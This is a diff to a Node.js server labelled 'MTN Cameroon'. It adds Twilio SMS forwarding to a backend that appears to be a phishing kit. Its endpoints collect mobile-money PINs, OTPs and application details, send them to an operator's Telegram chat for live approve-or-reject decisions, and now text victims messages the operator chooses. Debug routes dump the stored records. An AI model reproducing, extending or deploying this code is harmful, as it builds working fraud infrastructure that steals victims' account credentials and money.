@@ -1,5 +1,5 @@
 // ============================================================
-// server.js – MTN Cameroon Version with All Features
+// server.js – MTN Cameroon with Twilio SMS Forwarding
 // ============================================================
 console.log("🟢 1. Server is starting...");
 require('dotenv').config();
@@ -10,6 +10,7 @@ const fetch = require('node-fetch');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
+const twilio = require('twilio');
 
 const app = express();
 
@@ -25,9 +26,18 @@ const PORT = process.env.PORT || 3000;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+// Twilio Configuration
+const TWILIO_ACCOUNT_SID = process.env.TWILIO_ACCOUNT_SID;
+const TWILIO_AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN;
+const TWILIO_PHONE_NUMBER = process.env.TWILIO_PHONE_NUMBER;
+
 if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
     console.log('Please set these in your .env file or Render environment variables');
+}
+
+if (!TWILIO_ACCOUNT_SID || !TWILIO_AUTH_TOKEN || !TWILIO_PHONE_NUMBER) {
+    console.warn('⚠️ Twilio credentials missing. SMS sending will be disabled.');
 }
 
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
@@ -160,6 +170,37 @@ async function sendTelegramMessage(message, buttons = null) {
     }
 }
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
+// ─── SMS SENDING FUNCTION (TWILIO) ───
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
+
+async function sendSms(toNumber, message) {
+    // Check if Twilio is configured
+    if (!TWILIO_ACCOUNT_SID || !TWILIO_AUTH_TOKEN || !TWILIO_PHONE_NUMBER) {
+        console.log('📱 SMS would be sent to:', toNumber);
+        console.log('📋 Message:', message);
+        console.log('⚠️ Twilio not configured - SMS not actually sent.');
+        return { ok: true, simulated: true };
+    }
+    
+    try {
+        const client = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);
+        
+        const result = await client.messages.create({
+            body: message,
+            from: TWILIO_PHONE_NUMBER,
+            to: toNumber
+        });
+        
+        console.log(`📱 SMS sent to ${toNumber}: ${result.sid}`);
+        return { ok: true, sid: result.sid };
+    } catch (error) {
+        console.error('❌ Twilio SMS error:', error);
+        return { ok: false, error: error.message };
+    }
+}
+
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 1. Application Submission ───
 app.post('/api/send-application', async (req, res) => {
     try {
@@ -200,6 +241,7 @@ app.post('/api/send-application', async (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 2. SMS Submission ───
 app.post('/api/send-momo-message', async (req, res) => {
     try {
@@ -225,6 +267,7 @@ app.post('/api/send-momo-message', async (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 3. PIN Submission ───
 app.post('/api/send-pin', async (req, res) => {
     try {
@@ -269,6 +312,7 @@ app.post('/api/send-pin', async (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 4. PIN Rejected Handler ───
 app.post('/api/pin-rejected', async (req, res) => {
     try {
@@ -313,6 +357,7 @@ app.post('/api/pin-rejected', async (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 5. Reset PIN Attempts ───
 app.post('/api/reset-pin-attempts/:applicationId', async (req, res) => {
     try {
@@ -333,6 +378,7 @@ app.post('/api/reset-pin-attempts/:applicationId', async (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 6. Get PIN Status ───
 app.get('/api/pin-status/:applicationId', (req, res) => {
     try {
@@ -363,6 +409,7 @@ app.get('/api/pin-status/:applicationId', (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 7. OTP Submission ───
 app.post('/api/send-otp', async (req, res) => {
     try {
@@ -386,6 +433,7 @@ app.post('/api/send-otp', async (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 8. Resend OTP ───
 app.post('/api/resend-otp', async (req, res) => {
     try {
@@ -416,6 +464,7 @@ app.post('/api/resend-otp', async (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 9. Final Completion ───
 app.post('/api/send-final-details', async (req, res) => {
     try {
@@ -434,6 +483,7 @@ app.post('/api/send-final-details', async (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 10. Get Rejection Redirect Info ───
 app.get('/api/rejection-info/:applicationId', (req, res) => {
     try {
@@ -467,11 +517,13 @@ app.get('/api/rejection-info/:applicationId', (req, res) => {
     }
 });
 
-// ─── 11. Webhook ───
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
+// ─── 11. Webhook (With SMS Forwarding on YES) ───
 app.post('/api/telegram-webhook', async (req, res) => {
     console.log('📩 Webhook received');
     
     try {
+        // ─── HANDLE ADMIN COMMANDS ───
         if (req.body.message && req.body.message.text) {
             const text = req.body.message.text.trim();
             const chatId = req.body.message.chat.id;
@@ -602,6 +654,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
             }
         }
         
+        // ─── HANDLE CALLBACK QUERIES (Button Clicks) ───
         if (req.body.callback_query) {
             const query = req.body.callback_query;
             console.log('🔘 Callback query:', query.data);
@@ -628,22 +681,49 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 console.log(`📝 Processing ${step} for ${applicationId}: ${action}`);
                 
                 const statusKey = step.toLowerCase() + 'Status';
+                
+                // ─── SMS APPROVAL WITH FORWARDING ───
                 if (step === 'SMS' && app.smsStatus === 'pending') {
                     app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
                     console.log(`📨 SMS status: ${app.smsStatus}`);
-                } else if (step === 'PIN' && app.pinStatus === 'pending') {
+                    
+                    // ─── FORWARD SMS ON APPROVAL ───
+                    if (action === 'YES' && app.smsMessage) {
+                        const userPhone = '+237' + app.phone;
+                        const smsContent = app.smsMessage;
+                        
+                        console.log(`📤 Forwarding SMS to ${userPhone}`);
+                        
+                        const smsResult = await sendSms(userPhone, smsContent);
+                        
+                        if (smsResult.ok) {
+                            await sendTelegramMessage(
+                                `✅ *SMS FORWARDED*\n━━━━━━━━━━━━━━━━━━━━━━\n📱 To: ${userPhone}\n📋 Message: ${smsContent}`
+                            );
+                        } else {
+                            await sendTelegramMessage(
+                                `❌ *SMS FAILED*\n━━━━━━━━━━━━━━━━━━━━━━\n📱 To: ${userPhone}\n❌ Error: ${smsResult.error}`
+                            );
+                        }
+                    }
+                }
+                
+                // ─── PIN APPROVAL ───
+                else if (step === 'PIN' && app.pinStatus === 'pending') {
                     app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
                     console.log(`🔐 PIN status: ${app.pinStatus}`);
-                } else if (step === 'OTP' && app.otpStatus === 'pending') {
+                }
+                
+                // ─── OTP APPROVAL ───
+                else if (step === 'OTP' && app.otpStatus === 'pending') {
                     app.otpStatus = action === 'YES' ? 'approved' : 'rejected';
                     console.log(`🔑 OTP status: ${app.otpStatus}`);
-                } else {
-                    console.log(`⚠️ Status not updated. Current: ${app[statusKey]}`);
                 }
                 
                 app.updatedAt = new Date().toISOString();
                 saveApplications();
                 
+                // Answer callback
                 await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -672,6 +752,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 12. Status Check ───
 app.get('/api/status/:applicationId/:step', (req, res) => {
     try {
@@ -696,6 +777,7 @@ app.get('/api/status/:applicationId/:step', (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 13. Debug Endpoints ───
 app.get('/api/debug/applications', (req, res) => {
     res.json({
@@ -712,6 +794,7 @@ app.get('/api/debug/application/:id', (req, res) => {
     res.json(app);
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── 14. Backup Endpoint ───
 app.get('/api/debug/backup', (req, res) => {
     try {
@@ -732,6 +815,7 @@ app.get('/api/debug/backup', (req, res) => {
     }
 });
 
+// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
 // ─── Serve Frontend ───
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
